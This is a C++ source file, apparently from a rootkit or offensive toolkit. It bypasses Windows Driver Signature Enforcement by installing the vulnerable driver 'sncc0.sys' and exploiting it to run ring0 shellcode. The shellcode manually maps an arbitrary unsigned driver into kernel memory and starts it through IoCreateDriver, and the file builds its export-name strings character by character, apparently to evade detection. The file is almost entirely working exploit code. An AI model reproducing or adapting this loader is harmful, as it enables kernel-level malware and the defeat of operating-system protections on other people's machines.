#include "stdafx.h"

// make crt functions inline
#pragma intrinsic(memcpy, memset)

/*
    Name and path for vulnerable driver that will
    be installed for DSE bypass.
*/
#define VULN_DRIVER_FILE_NAME "sncc0.sys"
#define VULN_SERVICE_NAME "sncc0"

typedef struct _KERNEL_EXPL_CONTEXT
{
    // information about source image
    PVOID Data;
    DWORD DataSize;

    // information about loaded image that will be returned by kernel_expl_handler()
    PVOID Addr;
    NTSTATUS Status;

    // information about kernel environment
    PVOID KernelBase;
    func_ExAllocatePool f_ExAllocatePool;
    func_ExFreePoolWithTag f_ExFreePoolWithTag;
    func_IoCreateDriver f_IoCreateDriver;    

} KERNEL_EXPL_CONTEXT,
*PKERNEL_EXPL_CONTEXT;

extern "C"
{
// functions used in ring0 shellcode
void kernel_expl_handler(void *context);
}
//--------------------------------------------------------------------------------------
void kernel_expl_handler(void *context)
{
    PKERNEL_EXPL_CONTEXT pContext = (PKERNEL_EXPL_CONTEXT)context;

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)RVATOVA(
        pContext->Data, 
        ((PIMAGE_DOS_HEADER)pContext->Data)->e_lfanew
    );    

    // allocate memory for driver image
    DWORD dwImageSize = pHeaders->OptionalHeader.SizeOfImage;
    PUCHAR pImage = (PUCHAR)pContext->f_ExAllocatePool(NonPagedPool, dwImageSize);
    if (pImage)
    {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
            RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

        // copy image headers
        memset(pImage, 0, dwImageSize);
        memcpy(pImage, pContext->Data, pHeaders->OptionalHeader.SizeOfHeaders);

        // copy sections        
        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
        {
            memcpy(
                RVATOVA(pImage, pSection->VirtualAddress),
                RVATOVA(pContext->Data, pSection->PointerToRawData),
                min(pSection->SizeOfRawData, pSection->Misc.VirtualSize)
            );

            pSection += 1;
        }        

        // process image relocations
        if (!LdrProcessRelocs(pImage, pImage))
        {
            goto end;
        }

        char szExport_1[] = { 'm', '_', 'K', 'e', 'r', 'n', 'e', 'l', '\0' };
        char szExport_2[] = { 'm', '_', 'D', 'r', 'i', 'v', 'e', 'r', '\0' };

        PVOID *KernelBase = (PVOID *)LdrGetProcAddress(pImage, szExport_1);
        if (KernelBase)
        {
            // tell the kernel image base to the driver
            *KernelBase = pContext->KernelBase;
        }

        PVOID *DriverBase = (PVOID *)LdrGetProcAddress(pImage, szExport_2);
        if (DriverBase)
        {
            // tell the actual image base to the driver
            *DriverBase = pImage;
        }

        typedef NTSTATUS (NTAPI * DRIVER_ENTRY)(
            PVOID DriverObject,
            PUNICODE_STRING RegistryPath
        );        

        // get driver entry point address
        DRIVER_ENTRY Entry = (DRIVER_ENTRY)RVATOVA(
            pImage,
            pHeaders->OptionalHeader.AddressOfEntryPoint
        );        

        // call driver entry point
        if ((pContext->Status = (NTSTATUS)pContext->f_IoCreateDriver(NULL, Entry)) == STATUS_SUCCESS)
        {
            pContext->Addr = pImage;

            // success
            return;
        }        
end:
        pContext->f_ExFreePoolWithTag(pImage, 0);
    }
}
//--------------------------------------------------------------------------------------
bool kernel_expl_load_driver(void *data, unsigned int size)
{
    bool ret = false;
    KERNEL_EXPL_CONTEXT context;
    
    context.Data = data;
    context.DataSize = size;
    context.Addr = NULL;
    context.Status = STATUS_UNSUCCESSFUL;    

    if ((context.KernelBase = KernelGetModuleBase("ntoskrnl.exe")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to get kernel base\n");
        goto end;
    }

    // get real address of nt!ExAllocatePool()
    if ((context.f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr("ExAllocatePool")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!ExAllocatePool()\n");
        goto end;
    }

    // get real address of nt!ExFreePoolWithTag()
    if ((context.f_ExFreePoolWithTag = (func_ExFreePoolWithTag)KernelGetProcAddr("ExFreePoolWithTag")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!ExFreePoolWithTag()\n");
        goto end;
    }

    // get real address of nt!IoCreateDriver()
    if ((context.f_IoCreateDriver = (func_IoCreateDriver)KernelGetProcAddr("IoCreateDriver")) == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't find address of nt!IoCreateDriver()\n");
        goto end;
    }

    char szDestPath[MAX_PATH];
    GetSystemDirectory(szDestPath, sizeof(szDestPath));
    lstrcat(szDestPath, "\\drivers\\" VULN_DRIVER_FILE_NAME);

    // copy vulnerable driver to the system directory
    if (CopyFile(VULN_DRIVER_FILE_NAME, szDestPath, FALSE))
    {
        // run vulnerable driver
        BOOL bUnload = InfLoadDriver(VULN_SERVICE_NAME, szDestPath);        

        // run exploit
        expl_SNCC0_Sys_220010(kernel_expl_handler, &context);

        if (bUnload)
        {
            InfUnloadDriver(VULN_SERVICE_NAME);
        }

        DeleteFile(szDestPath);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "CopyFile() ERROR %d\n", GetLastError());
    }    

    // check for successful result
    if (ret = NT_SUCCESS(context.Status))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Driver loaded at "IFMT"\n", context.Addr);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Can't load driver\n");
    }

end:

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
